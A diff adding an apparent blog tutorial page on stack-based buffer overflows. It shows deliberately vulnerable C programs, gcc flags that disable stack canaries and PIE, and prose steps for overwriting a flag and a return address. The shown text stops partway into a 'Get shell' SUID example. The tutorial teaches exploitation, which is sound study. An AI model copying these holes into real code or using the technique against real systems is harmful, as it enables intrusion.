@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.github.io/blog/stack-based-buffer-overflows/"><!-- Primary Meta Tags --><title>Stack-based buffer overflows</title><meta name="title" content="Stack-based buffer overflows"><meta name="description" content="todo"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.github.io/blog/stack-based-buffer-overflows/"><meta property="og:title" content="Stack-based buffer overflows"><meta property="og:description" content="todo"><meta property="og:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.github.io/blog/stack-based-buffer-overflows/"><meta property="twitter:title" content="Stack-based buffer overflows"><meta property="twitter:description" content="todo"><meta property="twitter:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><link rel="stylesheet" href="/_astro/_slug_.D-Spfgqn.css">
+<style>code[class*=language-],pre[class*=language-]{color:#f5f5f5;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2);background:none;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#34294f}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#969896}.token.punctuation{color:#ccc}.token.selector{color:#72f1b8;text-shadow:0 0 2px #100c0f,0 0 10px rgba(37,124,85,.4588235294),0 0 35px rgba(33,39,36,.4588235294)}.token.function-name{color:#6196cc}.token.constant,.token.symbol{color:#f92aad;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2)}.token.attr-value,.token.char,.token.regex,.token.variable{color:#f87c32}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.token.string{color:#90ee90}.token.class-name,.token.deleted,.token.directive.keyword+.token.string,.token.hexcode,.token.namespace,.token.tag,.token.unit{color:#fff;text-shadow:0 0 1px #ff4d4d,0 0 2px #ff4d4d,0 0 4px #ff4d4d,0 0 10px #ff4d4d,0 0 20px #ff4d4d}.token.macro{color:#fff;text-shadow:0 0 1px #f8d132,0 0 2px #f8d132,0 0 4px #f8d132,0 0 10px #f8d132,0 0 20px #f8d132}.token.attr-name,.token.boolean,.token.function,.token.selector .token.id{color:#fff;text-shadow:0 0 1px #00f2ff,0 0 2px #00f2ff,0 0 4px #00f2ff,0 0 10px #00f2ff,0 0 20px #00f2ff}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector .token.class,.token.token.directive-hash{color:#fff;text-shadow:0 0 1px #bd32f8,0 0 2px #bd32f8,0 0 4px #bd32f8,0 0 10px #bd32f8,0 0 20px #bd32f8}main[data-astro-cid-bvzihdzo]{width:100%;background-color:#222}.hero-image[data-astro-cid-bvzihdzo]{width:40ch;max-width:100%;margin:auto}.hero-image[data-astro-cid-bvzihdzo] img[data-astro-cid-bvzihdzo]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-bvzihdzo]{width:80ch;max-width:100%;margin:auto;color:#d3d3d3}.title[data-astro-cid-bvzihdzo]{margin-bottom:1rem;padding:1rem 0;text-align:center;line-height:1}.title[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0 0 .5rem}.date[data-astro-cid-bvzihdzo]{margin-bottom:.5rem;color:#fff}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}.title-name[data-astro-cid-bvzihdzo]{font-family:Iceland;color:#fff}.prose[data-astro-cid-bvzihdzo] img{display:flex;margin:0 auto 2em}.prose[data-astro-cid-bvzihdzo] p{margin-bottom:2em}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  <a href="/blog" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blog </a>  <a href="/open-source" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Open Source </a>  </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="hero-image" data-astro-cid-bvzihdzo> <img src="/_astro/stack-overflow.VznqiZXX_ZDz1Ma.webp" alt="" data-astro-cid-bvzihdzo width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2023-10-20T00:00:00.000Z"> Oct 20, 2023 </time>  </div> <h1 class="title-name" data-astro-cid-bvzihdzo>Stack-based buffer overflows</h1> <hr data-astro-cid-bvzihdzo> </div>  <ul>
+<li><a href="#whats-a-buffer-overflow">What’s a buffer overflow?</a></li>
+<li><a href="#whats-the-stack">What’s the stack?</a></li>
+<li><a href="#stack-based-buffer-overflows-1">Stack based buffer overflows</a>
+<ul>
+<li><a href="#overwrite-local-variable-in-stack-frame">Overwrite local variable in stack
+frame</a></li>
+<li><a href="#overwrite-return-address">Overwrite return address</a></li>
+<li><a href="#get-shell">Get shell</a></li>
+</ul>
+</li>
+<li><a href="#how-can-we-prevent-buffer-overflows">How can we prevent buffer
+overflows?</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h1 id="whats-a-buffer-overflow">What’s a buffer overflow?</h1>
+<p>Buffer overflows are a type of vulnerability where the attacker gives
+more data to a buffer than it can handle. As a result, the program
+overwrites adjacent memory locations with the exceeding data. Usually,
+the program will crash. However, a skilled hacker can take control of
+the program as it crashes and achieve incredible things, like access to
+a shell. Nowadays, there are some countermeasures in place. They make it
+much harder but not impossible. Especially if using languages like C or
+C++, that lets developers manage the memory.</p>
+<p>There are two types of buffer overflows: stack-based and heap-based. In
+this post, we will talk about the first type.</p>
+<h1 id="whats-the-stack">What’s the stack?</h1>
+<p>Before jumping right into stack-based buffer overflows, we need to
+understand what a “stack” is in this context and how it works.</p>
+<p>The stack is a region of memory reserved for each thread to store data.
+Each time you call a function, a stack frame is created where the
+arguments, the local variables and the return address are stored in a
+Last Input First Output (LIFO) manner. Once it finishes, the program
+“removes” the stack frame from the stack and resumes the execution of
+the caller thanks to the return address. Now, on the top of the stack,
+we have the stack frame from the resumed function. The program is ready
+to go.</p>
+<p>Stack example:</p>
+<p><img  src="/_astro/stack-frame-graph.CG16iFSp_v9cnP.webp" alt="" width="359" height="216" loading="lazy" decoding="async"></p>
+<p>Great! We understand the basis of how the stack works at a high level.
+However, we still need to know the low-level details of that process if
+we want to exploit it. So, what’s actually happening? How does the
+computer know which instruction to execute? How does the computer know
+how to resume the execution of the caller function? How does it create
+and remove the stack frame? That’s all due to registers. The CPU of a
+computer use different registers to store data, transfer data, store
+instructions, … We are interested in the Extended Instruction Pointer
+(EIP), which stores the memory address of the next instruction to
+execute; the Extended Stack Pointer (ESP), which points to the top of
+the stack frame; and the Extended Base Pointer (EBP), which points to
+the bottom of the stack frame. Whenever we call a function, the EBP will
+store the actual ESP. The end of the caller function stack frame is the
+beginning of the called function stack frame. Pushing data to the stack
+will increase the ESP. The EIP will point to the next instruction to
+execute. Once we reach the return statement, the ESP will be equal to
+EBP (removing the stack frame) and the EIP will be equal to the return
+address. The process is much more complex than that. For instance, I’m
+not explaining how the EBP is restored. I encourage you to do some
+further research about the topic. I don’t think we need more for that
+post.</p>
+<p>We should have a clear idea of how stack frames work and some lower
+details. We are ready to exploit some programs.</p>
+<h1 id="stack-based-buffer-overflows-stack-based-buffer-overflows-1">Stack based buffer overflows [stack-based-buffer-overflows-1]</h1>
+<p>Relevant system information:</p>
+<ul>
+<li>Linux 5.15.0-86-generic x86_64</li>
+<li>Intel(R) Core(TM) i7-10510U CPU</li>
+<li>Little Endian</li>
+<li>48 bits address size</li>
+</ul>
+<p>All the vulnerable programs are from <strong>Hacking: The Art of Exploitation,
+2nd Edition</strong>. They may contain modification to use in modern machines.
+You can get the original source code
+<a href="https://github.com/intere/hacking/blob/master/booksrc">https://github.com/intere/hacking/blob/master/booksrc</a>.</p>
+<h2 id="overwrite-local-variable-in-stack-frame">Overwrite local variable in stack frame</h2>
+<p>Let’s start with the <code>auth_overflow.c</code>.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">check_authentication</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">int</span> auth_flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">char</span> password_buffer<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> <span class="token string">"brillig"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    auth_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> <span class="token string">"outgrabe"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    auth_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">return</span> auth_flag<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;password>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_authentication</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"      Access Granted.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nAccess Denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The program is simple. It receives a password. If it’s equal to
+“brillig” or “outgrabe” we will see the message “Access Granted”,
+otherwise, we will see “Access Denied”. With a buffer overflow, we can
+get the “Access Granted” message even when the password is invalid.</p>
+<p>The error is inside the <code>check_authentication</code> function, which copies
+the <code>password</code> data to the <code>password_buffer</code> without checking the
+length. Notice that the <code>password_buffer</code> can hold a maximum of 16
+bytes. In other words, the program will reserve 16 bytes in the stack
+for that variable. Nevertheless, the data behind the <code>password</code> pointer
+can hold a larger array of characters. The idea here is to give the
+program a password longer than 16 bytes so that when the data is copied
+into the <code>password_buffer</code>, the extra bytes overwrite the <code>auth_flag</code>.
+That’s the boolean that decides the message to be shown. If we can
+control it, we can control the printed message. Remember that the stack
+frame is a LIFO. Hence, the <code>password_buffer</code> will be on top of the
+<code>auth_flag</code>.</p>
+<p>Let’s compile the program and execute it with a bigger password than
+expected.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc auth_overflow.c <span class="token parameter variable">-o</span> auth_overflow
+./auth_overflow <span class="token string">"password"</span>
+</code></pre>
+<p>I’ve tried with several lengths. With 25 characters, the program fails.</p>
+<p><img  src="/_astro/auth-overflow-stack-smashing.BS7gZKkC_Z13DjUp.webp" alt="" width="1182" height="244" loading="lazy" decoding="async"></p>
+<p>There’s something curious, though. The function variables only take 20
+bytes, 16 for the <code>password_buffer</code> and 4 for the <code>auth_flag</code>, but we
+need 25 bytes to make it fail. I did some research, and it seems like it
+could be related to some padding that the compiler or the system is
+adding between variables. In any case, the program is failing with
+“stack smashing”. That tells us that the compiler detected the buffer
+overflow attack and stoped the execution. Current versions of GCC use
+“canaries” to detect buffer overflows. It adds some data in the stack
+frame at the beginning of the function and expects that it remains
+unchanged when exiting it. Let’s disable that for our learning.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc auth_overflow.c <span class="token parameter variable">-o</span> auth_overflow -fno-stack-protector
+</code></pre>
+<p><img  src="/_astro/auth-overflow-no-stack-protector.intDcIbx_ms7T0.webp" alt="" width="687" height="117" loading="lazy" decoding="async"></p>
+<p>With canaries disabled, let’s see how many bytes are between the
+<code>password_buffer</code> and the <code>auth_flag</code>. That will tell us the password
+length needed to overwrite the <code>auth_flag</code>. For that, we can use gdb.
+It’s only a matter of placing a breakpoint inside the vulnerable
+function and checking the memory addresses.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc auth_overflow.c <span class="token parameter variable">-o</span> auth_overflow -fno-stack-protector <span class="token parameter variable">-g</span> <span class="token comment"># -g option adds debug symbols</span>
+gdb ./auth_overflow
+</code></pre>
+<p><img  src="/_astro/auth-overflow-gdb-variables-distance.FmqLgIFi_cdWI7.webp" alt="" width="1311" height="754" loading="lazy" decoding="async"></p>
+<p>There are 28 bytes between the two variables. That means that we need a
+password with 29 characters. The first 28 to fill the space between the
+variables, and the last one to overwrite the <code>auth_flag</code>. We need it to
+be different to 0. For example, “a” should overwrite the <code>auth_flag</code>
+value with its ASCII decimal value (97). We can see that in action by
+placing a couple of breakpoints. One before the <code>strcpy</code> and one after.</p>
+<p><img  src="/_astro/auth-overflow-auth-flag-new-value.DpYRttl__Z1toXRs.webp" alt="" width="1726" height="378" loading="lazy" decoding="async"></p>
+<p>That’s it! We got the “Access Granted” message.</p>
+<p><img  src="/_astro/auth-overflow-access-granted.COtVhOm0_ZXItMB.webp" alt="" width="677" height="285" loading="lazy" decoding="async"></p>
+<h2 id="overwrite-return-address">Overwrite return address</h2>
+<p>The first example is limited, right? We can do something interesting
+only if the variable we want to overwrite is stored in the stack before
+the one we are using to exploit it. What could we do if the variable is
+not there or appears after? The idea in that situation is to overwrite
+the return address.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">check_authentication</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">char</span> password_buffer<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">int</span> auth_flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> <span class="token string">"brillig"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    auth_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password_buffer<span class="token punctuation">,</span> <span class="token string">"outgrabe"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    auth_flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">return</span> auth_flag<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;password>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_authentication</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"      Access Granted.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nAccess Denied.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>First, compile it without security protections and debug symbols. Here
+we added the <code>no-pie</code> option. PIE stands for Position Independent
+Executable. If enabled, the executable will be loaded in a different
+memory address every time.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc auth_overflow2.c <span class="token parameter variable">-o</span> auth_overflow2 -fno-stack-protector -no-pie <span class="token parameter variable">-g</span>
+</code></pre>
+<p>Now, where is the return address? How can we overwrite it? As in the
+first example, gdb is our friend. We can put a breakpoint inside
+<code>check_authentication</code>, run and execute <code>info frame</code>. The <code>rip</code> register
+contains the return address.</p>
+<p><img  src="/_astro/auth-overflow2-info-frame.Bqdxd_ts_2qKL6D.webp" alt="" width="1309" height="323" loading="lazy" decoding="async"></p>
+<p>At this point, it’s a matter of trying several passwords until we find
+the number of bytes till the <code>rip</code> register. Same procedure as in the
+first example. Writing a password with 40 “a” and 3 “b” will overwrite
+the <code>rip</code> with the ASCII value of “bbb” (0x626262).</p>
+<p><img  src="/_astro/auth-overflow2-overwrite-rip.BbU-un7Z_eL0Kq.webp" alt="" width="1300" height="525" loading="lazy" decoding="async"></p>
+<p>That’s cool, but we want to overwrite the <code>rip</code> to change the code flow
+and show us the “Access Granted” message. We can disassemble the main
+function to see where the <code>print</code> functions are and get the memory
+address for the first <code>print</code>. The +86 memory address points to the
+conditional before the prints. We can take the next address. If PIE was
+enabled, this wouldn’t be that easy. The address would change every time
+we run it.</p>
+<p><img  src="/_astro/auth-overflow2-access-granted-address.CkDqvnED_lYhyL.webp" alt="" width="1103" height="962" loading="lazy" decoding="async"></p>
+<p>Replacing “bbb” with “7f1240” gives us the “Access Granted” message. We
+add the memory address in reverse because my machine uses Little Endian.</p>
+<p><img  src="/_astro/auth-overflow2-access-granted.ByReQBgo_28Ev2X.webp" alt="" width="1348" height="205" loading="lazy" decoding="async"></p>
+<h2 id="get-shell">Get shell</h2>
+<p>The second example was a bit more interesting, but still limited. In
+this final example, we are going to see how to get access to a shell.</p>
+<p>We have two small programs. The first program creates notes in
+“/var/notes”. root must own the executable and have the SUID activated.
+That way, we can execute it with normal users as if it was root.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"hacking.h"</span></span>
+
+<span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>prog_name<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;data to add to %s>\n"</span><span class="token punctuation">,</span> prog_name<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// A function for fatal errors</span>
+<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// An error-checked malloc() wrapper</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> userid<span class="token punctuation">,</span> fd<span class="token punctuation">;</span> <span class="token comment">// File descriptor</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token operator">*</span>datafile<span class="token punctuation">;</span>
+
+  buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  datafile <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>datafile<span class="token punctuation">,</span> <span class="token string">"/var/notes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span>                 <span class="token comment">// If there aren't command-line arguments,</span>
+    <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> datafile<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// display usage message and exit.</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Copy into buffer.</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] buffer @ %p: \'%s\'\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] datafile @ %p: \'%s\'\n"</span><span class="token punctuation">,</span> datafile<span class="token punctuation">,</span> datafile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// Opening the file</span>
+  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>datafile<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_APPEND<span class="token punctuation">,</span> S_IRUSR <span class="token operator">|</span> S_IWUSR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while opening file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] file descriptor is %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  userid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Get the real user ID.</span>
+
+  <span class="token comment">// Writing data</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&#x26;</span>userid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// Write user ID before note data.</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while writing userid to file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// Terminate line.</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// Write note.</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while writing buffer to file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
